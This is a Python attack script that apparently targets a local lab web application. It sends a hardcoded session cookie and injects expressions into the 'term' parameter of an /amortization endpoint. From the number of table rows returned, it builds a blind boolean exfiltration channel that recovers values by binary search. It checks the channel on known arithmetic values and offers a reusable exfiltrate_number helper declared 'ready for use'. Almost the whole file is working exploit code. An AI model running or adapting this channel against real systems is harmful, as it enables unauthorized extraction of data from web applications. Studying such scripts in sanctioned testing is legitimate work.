import requests
from bs4 import BeautifulSoup
from http.cookiejar import Cookie

BASE_URL = "http://127.0.0.1:32882"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxfQ.aVrtEQ.cccC7bt2RGU6ORe-2-Gb5vvKQps"

def get_authenticated_session():
    """Create session with authentication cookie"""
    session = requests.Session()
    cookie = Cookie(
        version=0, name='session', value=SESSION_COOKIE, port=None, port_specified=False,
        domain='127.0.0.1', domain_specified=True, domain_initial_dot=False,
        path='/', path_specified=True, secure=False, expires=None, discard=True,
        comment=None, comment_url=None, rest={}, rfc2109=False
    )
    session.cookies.set_cookie(cookie)
    return session

def count_rows(session, term):
    """Count rows in tbody for given term parameter"""
    try:
        response = session.get(f"{BASE_URL}/amortization", params={'term': term})
        if response.status_code != 200:
            return 0
        soup = BeautifulSoup(response.text, 'html.parser')
        tbody = soup.find('tbody')
        if not tbody:
            return 0
        return len(tbody.find_all('tr'))
    except:
        return 0

def test_condition(session, expression):
    """Test if expression evaluates to true (>0) using row count"""
    term = f"10*({expression})"
    return count_rows(session, term) > 0

def exfiltrate_number(session, expression, min_val=0, max_val=255, verbose=True):
    """Extract numeric value using binary search"""
    if verbose:
        print(f"\n[*] Extracting: {expression}")
        print(f"    Range: [{min_val}, {max_val}]")
    
    low = min_val
    high = max_val
    
    while low < high:
        mid = (low + high + 1) // 2
        comparison = f"({expression})>{mid}"
        result = test_condition(session, comparison)
        
        if verbose:
            print(f"    Testing ({expression}) > {mid}: {result}")
        
        if result:
            low = mid + 1
        else:
            high = mid
    
    if verbose:
        print(f"[+] Extracted value: {low}")
    return low

# Main validation
print("="*60)
print("BLIND EXFILTRATION CHANNEL VALIDATION")
print("="*60)
print(f"Target: {BASE_URL}/amortization")
print(f"Method: Binary search via boolean expressions")
print(f"Pattern: term=10*(expression)")
print("="*60)

session = get_authenticated_session()

# Step 1: Basic condition tests
print("\n[Step 1] Testing condition detection...")
test1 = test_condition(session, "1>0")
test2 = test_condition(session, "0>1")
print(f"  1>0 = {test1} (expected: True)")
print(f"  0>1 = {test2} (expected: False)")

if test1 and not test2:
    print("  ✓ Condition detection working!")
else:
    print("  ✗ Condition detection failed!")
    exit(1)

# Step 2: Validate with known expressions
print("\n[Step 2] Validating with known values...")
test_cases = [
    ("7*7", 49),
    ("100-50", 50),
    ("8*8", 64),
    ("5+5", 10),
    ("20/4", 5),
    ("1", 1),
    ("0", 0)
]

results = []
for expr, expected in test_cases:
    extracted = exfiltrate_number(session, expr, 0, 255, verbose=False)
    passed = (extracted == expected)
    results.append(passed)
    status = "✓" if passed else "✗"
    print(f"  {status} {expr} = {expected} (got: {extracted})")

# Summary
print("\n" + "="*60)
print("SUMMARY")
print("="*60)
passed = sum(results)
total = len(results)
print(f"Tests passed: {passed}/{total}")

if passed == total:
    print("\n✓ ALL TESTS PASSED - Channel validated successfully!")
    print("\nHelper function available:")
    print("  exfiltrate_number(session, expression, min_val, max_val)")
    print("\nExample usage:")
    print("  value = exfiltrate_number(session, '7*7', 0, 255)")
else:
    print(f"\n✗ {total-passed} test(s) failed")

print("\n[+] Blind exfiltration channel ready for use!")

